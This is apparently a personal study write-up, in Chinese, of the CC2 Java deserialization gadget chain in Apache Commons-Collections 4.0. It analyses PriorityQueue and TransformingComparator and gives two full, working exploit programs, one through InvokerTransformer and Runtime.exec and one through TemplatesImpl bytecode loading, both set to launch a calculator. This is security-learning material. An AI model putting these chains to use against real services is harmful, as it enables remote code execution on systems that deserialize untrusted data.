# 环境

- Commons-Collections 4.0

```
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

其余和CC1相同。

# CC2

首先看一下ysoserial给的Gadget chain：

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```

一个一个看

## 1、PriorityQueue

一个基于优先级的无界队列。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207142417.png)

## 2、TransformingComparator

TransformingComparator可以将一个对象的比较方式转化成另一个对象的比较方式 

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207144131.png)

## 利用链分析

PriorityQueue从创建Object类的数组开始，其实就是实现了这个类最重要的特性，创建了一个基于堆的队列优先数组。

在for循环中，就是将反序列化数据流中的元素，一个一个存在`queue`这个数组中，然后开始调用函数`heapify()`来进行重新排列。

跟进heapify()：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207150231.png)

跟进siftDown：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207150615.png)

跟进siftDownUsingComparator

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207151007.png)

发现调用任意Comparator类的compare方法。

接下来就有三种利用方式，CC1和CC3的TemlpateImpl。

## 利用CC1作为后半部分

先把compare最后要执行的Transform类准备好：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
};
Transformer transformerChain = new ChainedTransformer(transformers);
```

TransformingComparator和PriorityQueue都实现了Serializable接口，所以直接实例化就行：

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_LazyMap_8u65 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Comparator transformingcomparator = new TransformingComparator(transformerChain, new Comparator() {
            @Override
            public int compare(Object o1, Object o2) {
                return 0;
            }
        });
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingcomparator);
    }
}
```

最后就是如何保证能走到siftDownUsingComparator的conpare了。PriorityQueue里面有很多的if语句，我们一个个来看。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207182318.png)

调试运行一下发现这里size为零没过去，size代表了priority queue里面元素的数量

随便添加两个数试试：

```
priorityQueue.add(1);
priorityQueue.add(2);
```

运行发现添加第二个数时直接弹出计算器，下断点调试一下：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231207183053.png)

在添加第二个对象的时候会走到compare从而调用计算器，尝试用之前CC6的方法，也就是一开始传一个假的Transformer：

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_LazyMap_8u65 {
    public static void main(String[] args) throws Exception{
        Transformer[] faketransformer = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformer);
        Comparator transformingcomparator = new TransformingComparator(transformerChain);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingcomparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field f = org.apache.commons.collections4.functors.ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

成功弹出计算器。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231208121303.png)

调试细看一下为什么能执行：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231208123039.png)

有点凑巧的感觉。

注：<<、>>、<<<、>>>的含义：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231208124006.png)

## 利用CC3作为后半部分

exp：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_TemplatesImpl_8u65 {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] faketransformer = new org.apache.commons.collections4.Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        Transformer transformerChain = new ChainedTransformer(faketransformer);
        Comparator transformingcomparator = new TransformingComparator(transformerChain);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingcomparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

![image-20231208125643905](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231208125643905.png)

# 总结

对Java反序列化有了一点自己的理解，第一次完全独立写出一个exp。

熟能生巧。

# 参考链接

- https://xz.aliyun.com/t/12544#toc-4
- https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE